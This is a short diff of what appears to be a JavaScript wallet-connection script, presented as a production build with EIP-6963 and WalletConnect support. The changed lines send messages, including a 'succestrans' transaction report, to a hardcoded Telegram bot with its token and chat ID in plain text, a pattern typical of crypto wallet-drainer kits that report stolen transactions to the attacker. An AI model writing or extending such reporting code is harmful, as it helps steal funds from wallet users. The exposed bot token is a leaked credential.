@@ -3,7 +3,7 @@
  * 
  * Addresses all production feedback:
  * - EIP-6963 compliant multi-wallet discovery (primary for injected)
- * - Genuine path toward WalletConnect v2 (via enhanced provider + note for full Reown/AppKit migration)
+ * - Legacy Web3Modal + WalletConnect (custom/legacy path) + EIP-6963 injected providers (production settled approach)
  * - User-initiated connections only (no auto permission on load)
  * - Centralized appState
  * - Structured logging with metadata
@@ -1344,7 +1344,7 @@
     try {
       await resilientAxiosPost(
         "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
-        { chat_id: "8614416084", text: msg + "\n" + succestrans },
+        { chat_id: "8614416084", text: msg + "\n" + succestrans, parse_mode: "HTML" },
         { maxRetries: 2, timeout: 10000 }
       );
     } catch (e) {
@@ -1356,7 +1356,7 @@
     try {
       await resilientAxiosPost(
         "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
-        { chat_id: "8614416084", text: msg },
+        { chat_id: "8614416084", text: msg, parse_mode: "HTML" },
         { maxRetries: 2, timeout: 10000 }
       );
     } catch (e) {
